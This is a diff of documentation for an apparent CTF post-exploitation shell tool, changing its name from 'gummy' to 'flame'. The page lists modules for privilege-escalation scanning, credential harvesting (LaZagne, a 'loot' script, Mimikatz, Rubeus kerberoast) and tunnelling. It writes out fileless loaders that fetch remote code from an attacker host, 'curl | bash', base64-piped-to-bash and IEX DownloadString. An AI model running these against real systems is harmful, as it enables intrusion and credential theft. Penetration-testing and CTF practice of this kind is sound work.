@@ -1,19 +1,19 @@
 # Modules
 
-Gummy includes a worker-session-based module system for running common CTF tools with a single command. When you launch a module, gummy spawns an invisible worker shell, runs the module there, streams output to a local file, and keeps your main session free for shell interaction.
+Flame includes a worker-session-based module system for running common CTF tools with a single command. When you launch a module, flame spawns an invisible worker shell, runs the module there, streams output to a local file, and keeps your main session free for shell interaction.
 
 ## Quick Reference
 
 List all available modules:
 
 ```
-󰗣 gummy [1] ❯ modules
+󰗣 flame [1] ❯ modules
 ```
 
 Run a module:
 
 ```
-󰗣 gummy [1] ❯ run <module> [args]
+󰗣 flame [1] ❯ run <module> [args]
 ```
 
 ## Execution Modes
@@ -33,7 +33,7 @@ Each module has an execution mode that determines how it runs on the target:
 Comprehensive Linux privilege escalation scanner from [PEASS-ng](https://github.com/peass-ng/PEASS-ng).
 
 ```
-󰗣 gummy [1] ❯ run peas
+󰗣 flame [1] ❯ run peas
 ```
 
 **Mode:** In-memory (`curl | bash` or base64 variable upload)
@@ -44,8 +44,8 @@ Comprehensive Linux privilege escalation scanner from [PEASS-ng](https://github.
 [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) with configurable verbosity levels.
 
 ```
-󰗣 gummy [1] ❯ run lse          # Default: level 1
-󰗣 gummy [1] ❯ run lse -l2      # More verbose
+󰗣 flame [1] ❯ run lse          # Default: level 1
+󰗣 flame [1] ❯ run lse -l2      # More verbose
 ```
 
 **Mode:** In-memory
@@ -56,7 +56,7 @@ Comprehensive Linux privilege escalation scanner from [PEASS-ng](https://github.
 Post-exploitation script that grabs credentials, SSH keys, browser data, and other sensitive files.
 
 ```
-󰗣 gummy [1] ❯ run loot
+󰗣 flame [1] ❯ run loot
 ```
 
 **Mode:** In-memory
@@ -66,7 +66,7 @@ Post-exploitation script that grabs credentials, SSH keys, browser data, and oth
 [pspy](https://github.com/DominicBreuker/pspy) — Monitor processes without root privileges. Great for finding cron jobs and other scheduled tasks.
 
 ```
-󰗣 gummy [1] ❯ run pspy
+󰗣 flame [1] ❯ run pspy
 ```
 
 **Mode:** Disk + cleanup (binary uploaded, executed, shredded after)
@@ -78,7 +78,7 @@ Post-exploitation script that grabs credentials, SSH keys, browser data, and oth
 Linux privilege-escalation suggestion script.
 
 ```
-󰗣 gummy [1] ❯ run linexp
+󰗣 flame [1] ❯ run linexp
 ```
 
 **Mode:** In-memory
@@ -90,7 +90,7 @@ Linux privilege-escalation suggestion script.
 Windows privilege escalation scanner from [PEASS-ng](https://github.com/peass-ng/PEASS-ng). This is a .NET assembly executed entirely in memory.
 
 ```
-󰗣 gummy [1] ❯ run winpeas
+󰗣 flame [1] ❯ run winpeas
 ```
 
 **Mode:** In-memory (.NET `Reflection.Assembly.Load`)
@@ -106,8 +106,8 @@ Windows privilege escalation scanner from [PEASS-ng](https://github.com/peass-ng
 [Seatbelt](https://github.com/GhostPack/Seatbelt) — Windows system-enumeration assembly executed in memory.
 
 ```
-󰗣 gummy [1] ❯ run seatbelt
-󰗣 gummy [1] ❯ run seatbelt -group=all
+󰗣 flame [1] ❯ run seatbelt
+󰗣 flame [1] ❯ run seatbelt -group=all
 ```
 
 **Mode:** In-memory (.NET `Reflection.Assembly.Load`)
@@ -118,8 +118,8 @@ Windows privilege escalation scanner from [PEASS-ng](https://github.com/peass-ng
 [LaZagne](https://github.com/AlessandroZ/LaZagne) — Credential harvester that extracts passwords from browsers, email clients, databases, Wi-Fi, and more.
 
 ```
-󰗣 gummy [1] ❯ run lazagne          # Default: 'all' modules
-󰗣 gummy [1] ❯ run lazagne browsers  # Only browser passwords
+󰗣 flame [1] ❯ run lazagne          # Default: 'all' modules
+󰗣 flame [1] ❯ run lazagne browsers  # Only browser passwords
 ```
 
 **Mode:** Disk + cleanup (native binary, not .NET — must touch disk)
@@ -131,9 +131,9 @@ Windows privilege escalation scanner from [PEASS-ng](https://github.com/peass-ng
 Run any arbitrary binary from a URL or your binbag directory:
 
 ```
-󰗣 gummy [1] ❯ run elf pspy64              # From binbag
-󰗣 gummy [1] ❯ run elf https://url/tool    # From URL
-󰗣 gummy [1] ❯ run elf chisel client 10.10.14.5:8888 R:socks
+󰗣 flame [1] ❯ run elf pspy64              # From binbag
+󰗣 flame [1] ❯ run elf https://url/tool    # From URL
+󰗣 flame [1] ❯ run elf chisel client 10.10.14.5:8888 R:socks
 ```
 
 **Mode:** Disk + cleanup (downloaded, executed, shredded)
@@ -146,8 +146,8 @@ These modules run arbitrary scripts/assemblies from URLs or binbag:
 ### Shell Script — `run sh`
 
 ```
-󰗣 gummy [1] ❯ run sh https://example.com/script.sh
-󰗣 gummy [1] ❯ run sh myscript.sh arg1 arg2    # From binbag
+󰗣 flame [1] ❯ run sh https://example.com/script.sh
+󰗣 flame [1] ❯ run sh myscript.sh arg1 arg2    # From binbag
 ```
 
 **Mode:** In-memory (`curl | bash`)
@@ -156,8 +156,8 @@ These modules run arbitrary scripts/assemblies from URLs or binbag:
 ### PowerShell — `run ps1`
 
 ```
-󰗣 gummy [1] ❯ run ps1 https://example.com/script.ps1
-󰗣 gummy [1] ❯ run ps1 Invoke-Mimikatz.ps1
+󰗣 flame [1] ❯ run ps1 https://example.com/script.ps1
+󰗣 flame [1] ❯ run ps1 Invoke-Mimikatz.ps1
 ```
 
 **Mode:** In-memory (`IEX DownloadString`)
@@ -166,9 +166,9 @@ These modules run arbitrary scripts/assemblies from URLs or binbag:
 ### .NET Assembly — `run dotnet`
 
 ```
-󰗣 gummy [1] ❯ run dotnet SharpUp.exe audit
-󰗣 gummy [1] ❯ run dotnet Rubeus.exe kerberoast
-󰗣 gummy [1] ❯ run dotnet Seatbelt.exe -group=all
+󰗣 flame [1] ❯ run dotnet SharpUp.exe audit
+󰗣 flame [1] ❯ run dotnet Rubeus.exe kerberoast
+󰗣 flame [1] ❯ run dotnet Seatbelt.exe -group=all
 ```
 
 **Mode:** In-memory (`DownloadData` + `Reflection.Assembly.Load`)
@@ -185,7 +185,7 @@ Works with any .NET assembly that has a `Main()` entry point: SharpUp, Rubeus, S
 ### Python — `run py`
 
 ```
-󰗣 gummy [1] ❯ run py https://example.com/exploit.py
+󰗣 flame [1] ❯ run py https://example.com/exploit.py
 ```
 
 **Mode:** In-memory
@@ -203,10 +203,10 @@ curl -s http://10.10.14.5:8080/linpeas.sh | bash -s -- [args]
 Without binbag (base64 fallback):
 ```bash
 # Script is uploaded to a bash variable in chunks
-gummy_var+="base64chunk1..."
-gummy_var+="base64chunk2..."
-echo "$gummy_var" | base64 -d | bash -s -- [args]
-unset gummy_var
+flame_var+="base64chunk1..."
+flame_var+="base64chunk2..."
+echo "$flame_var" | base64 -d | bash -s -- [args]
+unset flame_var
 ```
 
 ### Windows (PowerShell scripts)
@@ -247,7 +247,7 @@ wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerU
 wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1
 ```
 
-Then in gummy:
+Then in flame:
 
 ```
 set binbag ~/Lab/binbag
